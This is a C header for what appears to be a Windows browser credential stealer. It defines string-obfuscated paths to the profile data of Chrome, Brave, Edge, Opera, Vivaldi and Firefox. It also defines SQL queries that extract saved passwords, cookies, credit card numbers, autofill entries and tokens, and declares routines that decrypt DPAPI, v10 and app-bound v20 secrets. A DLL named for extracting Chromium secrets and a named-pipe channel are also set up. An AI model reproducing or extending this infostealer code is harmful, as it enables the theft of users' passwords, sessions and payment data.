#pragma once
#ifndef COMMON_H
#define COMMON_H

#include <Windows.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <TlHelp32.h>
#include <Bcrypt.h>

#include "Debug.h"
#include "Obfuscate.hpp"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "bcrypt.lib")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Browser Type Enum

typedef enum _BROWSER_TYPE
{
    BROWSER_UNKNOWN = -1,
    BROWSER_CHROME,
    BROWSER_BRAVE,
    BROWSER_EDGE,
    BROWSER_OPERA,
    BROWSER_OPERA_GX,
    BROWSER_VIVALDI,
    BROWSER_FIREFOX,

} BROWSER_TYPE;

#define STR_CHROME_BRSR_NAME            OBFA_S("Chrome")
#define STR_BRAVE_BRSR_NAME             OBFA_S("Brave")
#define STR_EDGE_BRSR_NAME              OBFA_S("Msedge")
#define STR_EDGE_ALT_BRSR_NAME          OBFA_S("Edge")
#define STR_OPERA_BRSR_NAME             OBFA_S("Opera")
#define STR_OPERA_GX_BRSR_NAME          OBFA_S("OperaGX")
#define STR_OPERA_ALT_GX_BRSR_NAME      OBFA_S("Opera GX")
#define STR_VIVALDI_BRSR_NAME           OBFA_S("Vivaldi")
#define STR_FIREFOX_BRSR_NAME           OBFA_S("FireFox")
#define STR_UNKNOWN_BRSR_NAME           OBFA_S("Unknown")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define STR_DLL_NAME                    OBFW_S(L"DllExtractChromiumSecrets.dll")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define BUFFER_SIZE_16                  16
#define BUFFER_SIZE_32                  32
#define BUFFER_SIZE_64                  64
#define BUFFER_SIZE_128                 128
#define BUFFER_SIZE_256                 256
#define BUFFER_SIZE_512                 512
#define BUFFER_SIZE_1024                1024
#define BUFFER_SIZE_2048                2048
#define BUFFER_SIZE_4096                4096
#define BUFFER_SIZE_8192                8192

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PACKET_SIG_APP_BOUND_KEY        'YKBA'
#define PACKET_SIG_DPAPI_KEY            'YKDP'
#define PACKET_SIG_COMPLETE             'ENOD'

#pragma pack(push, 1)
#pragma warning(push)
#pragma warning(disable: 4200)
typedef struct _DATA_PACKET
{
    DWORD       dwSignature;
    DWORD       dwDataSize;
    BYTE        bData[];
} DATA_PACKET, * PDATA_PACKET;
#pragma warning(pop)
#pragma pack(pop)

#define PACKET_SIZE(DATASIZE) (sizeof(DATA_PACKET) + (DATASIZE))

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// APPB
#define CRYPT_APPBOUND_KEY_PREFIX       'BPPA'
#define CRYPT_APPBOUND_KEY_PREFIX_LEN   4

// DPAPI 
#define CRYPT_DPAPI_KEY_PREFIX          'PAPD' // "DPAPI" as a DWORD
#define CRYPT_DPAPI_KEY_PREFIX_LEN      5

// AES
#define AES_GCM_TAG_SIZE                16
#define AES_GCM_IV_SIZE                 12

// V20
#define CHROMIUM_V20_PREFIX             '02v'
#define CHROMIUM_V20_PREFIX_SIZE        3

// V10
#define CHROMIUM_V10_PREFIX             '01v'
#define CHROMIUM_V10_PREFIX_SIZE        3

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define HAS_V10_PREFIX(D, L)            ((L) >= CHROMIUM_V10_PREFIX_SIZE && (((*(PDWORD)(D)) & 0x00FFFFFF) == CHROMIUM_V10_PREFIX))
#define HAS_V20_PREFIX(D, L)            ((L) >= CHROMIUM_V20_PREFIX_SIZE && (((*(PDWORD)(D)) & 0x00FFFFFF) == CHROMIUM_V20_PREFIX))

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// File paths

typedef enum _BROWSER_FILE_TYPE
{
    FILE_TYPE_WEB_DATA,
    FILE_TYPE_HISTORY,
    FILE_TYPE_COOKIES,
    FILE_TYPE_LOGIN_DATA,
    FILE_TYPE_BOOKMARKS,
    FILE_TYPE_LOCAL_STATE

} BROWSER_FILE_TYPE;


#define CHROME_BASE_PATH                OBFA_S("Google\\Chrome\\User Data")
#define BRAVE_BASE_PATH                 OBFA_S("BraveSoftware\\Brave-Browser\\User Data")
#define EDGE_BASE_PATH                  OBFA_S("Microsoft\\Edge\\User Data")
#define OPERA_BASE_PATH                 OBFA_S("Opera Software\\Opera Stable")
#define OPERAGX_BASE_PATH               OBFA_S("Opera Software\\Opera GX Stable")
#define VIVALDI_BASE_PATH               OBFA_S("Vivaldi\\User Data")

#define SUFFIX_WEB_DATA                 OBFA_S("\\Default\\Web Data")
#define SUFFIX_HISTORY                  OBFA_S("\\Default\\History")
#define SUFFIX_COOKIES                  OBFA_S("\\Default\\Network\\Cookies")
#define SUFFIX_LOGIN_DATA               OBFA_S("\\Default\\Login Data")
#define SUFFIX_BOOKMARKS                OBFA_S("\\Default\\Bookmarks")
#define SUFFIX_LOCAL_STATE              OBFA_S("\\Local State")


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// SQL Queries

#define SQLQUERY_TOKEN_SERVICE          OBFA_S("SELECT service, encrypted_token, binding_key FROM token_service;")
#define SQLQUERY_OPERA_ACCESS_TOKENS    OBFA_S("SELECT client_name, encoded_scopes, token, expiration_date FROM access_tokens;")
#define SQLQUERY_CREDIT_CARDS           OBFA_S("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, nickname, date_modified FROM credit_cards;")
#define SQLQUERY_AUTOFILL               OBFA_S("SELECT name, value, date_created, count FROM autofill;")
#define SQLQUERY_HISTORY                OBFA_S("SELECT url, title, visit_count, last_visit_time FROM urls;")
#define SQLQUERY_COOKIES                OBFA_S("SELECT host_key, path, name, expires_utc, encrypted_value FROM cookies;")
#define SQLQUERY_LOGINS                 OBFA_S("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins;")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Bookmarks
#define JSON_KEY_TYPE                   OBFA_S("\"type\"")
#define JSON_KEY_TYPE_LEN               6
#define JSON_KEY_NAME                   OBFA_S("\"name\"")
#define JSON_KEY_NAME_LEN               6
#define JSON_KEY_URL                    OBFA_S("\"url\"")
#define JSON_KEY_URL_LEN                5
#define JSON_VALUE_URL                  OBFA_S("url")
#define JSON_VALUE_URL_LEN              3

// Local State App Bound Encryption Key
#define JSON_PARENT_KEY                 OBFA_S("os_crypt")
#define JSON_CHILD_KEY                  OBFA_S("app_bound_encrypted_key")

// Local State Encryption Key (Used For V10 Secrets)
#define JSON_CHILD_KEY_V10              OBFA_S("encrypted_key")

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define PIPE_NAME_FRMT                  OBFA_S("\\\\.\\pipe\\%08X%08X")


static inline VOID GetPipeName(OUT LPSTR pszPipeName, IN DWORD dwSize)
{
    DWORD   dwState1    = 0x5EED1234,
            dwState2    = 0x00,
            dwSerial    = 0x00;

    GetVolumeInformationA("C:\\", NULL, 0, &dwSerial, NULL, NULL, NULL, 0);
    
    dwState1 ^= dwSerial;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState1 ^= dwState1 << 13;
        dwState1 ^= dwState1 >> 17;
        dwState1 ^= dwState1 << 5;
    }

    dwState2 = dwState1;

    for (DWORD i = 0; i < BUFFER_SIZE_16; i++)
    {
        dwState2 ^= dwState2 << 13;
        dwState2 ^= dwState2 >> 17;
        dwState2 ^= dwState2 << 5;
    }

    StringCchPrintfA(pszPipeName, dwSize, PIPE_NAME_FRMT, dwState1, dwState2);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

#define HEAP_FREE(ptr)                                      \
    do {                                                    \
        if (ptr) {                                          \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


#define HEAP_FREE_SECURE(ptr, size)                         \
    do {                                                    \
        if (ptr) {                                          \
            SecureZeroMemory((PVOID)ptr, size);             \
            HeapFree(GetProcessHeap(), 0, (LPVOID)ptr);     \
            ptr = NULL;                                     \
        }                                                   \
    } while (0)


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

LPSTR BytesToHexString(IN PBYTE pbData, IN DWORD cbData);

PBYTE DuplicateBuffer(IN PBYTE pbSrc, IN DWORD dwLen);

LPSTR DuplicateAnsiString(IN LPCSTR pszSrc);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL ReadFileFromDiskA(IN LPCSTR pszFilePath, OUT PBYTE* ppFileBuffer, OUT PDWORD pdwFileSize);

LPSTR FindJsonStringValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

BOOL FindJsonIntValue(IN LPCSTR pszJson, IN LPCSTR pszKey, OUT PINT64 pllValue);

LPSTR FindJsonArrayValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszKey, OUT PDWORD pcbValue);

LPSTR FindNestedJsonValue(IN LPCSTR pszJson, IN DWORD cbJson, IN LPCSTR pszParentKey, IN LPCSTR pszChildKey, OUT PDWORD pcbValue);

LPSTR FindNestedJsonObject(IN LPCSTR pszJson, IN DWORD dwJson, IN LPCSTR pszKey, OUT PDWORD pdwObjectLen);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL DecryptDpapiBlob(IN PBYTE pBlob, IN DWORD dwBlob, OUT PBYTE* ppDecrypted, OUT PDWORD pcbDecrypted);

PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput);

BOOL DecryptChromiumV10Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret);

BOOL DecryptChromiumV20Secret(IN PBYTE pbKey, IN DWORD cbKey, IN PBYTE pbEncryptedSecret, IN DWORD cbEncryptedSecret, OUT PBYTE* ppbDecryptedSecret, OUT PDWORD pcbDecryptedSecret);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// Getters

// Works For All Browsers
LPCSTR GetBrowserName(IN BROWSER_TYPE Browser);

// Works For All Browsers
LPCSTR GetBrowserProcessName(IN BROWSER_TYPE Browser);

// The following getter is Chromium-only because Firefox stores its data files
// inside a dynamic profile folder (e.g., Mozilla\Firefox\Profiles\xxxxxxxx.default-release\)
// that must be resolved at runtime

// Chromium Only
BOOL GetChromiumBrowserFilePath(IN BROWSER_TYPE Browser, IN BROWSER_FILE_TYPE FileType, OUT LPSTR pszBuffer, IN DWORD dwBufferSize);

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

LPSTR GetBrowserDataFilePath(IN BROWSER_TYPE Browser, IN LPCSTR pszRelPath);

DWORD GetBrowserDataFilePathEx(IN BROWSER_TYPE Browser, IN LPCSTR* ppszRelPaths, IN DWORD dwFileCount);

VOID DeleteDataFilesCache();

#endif // !COMMON_H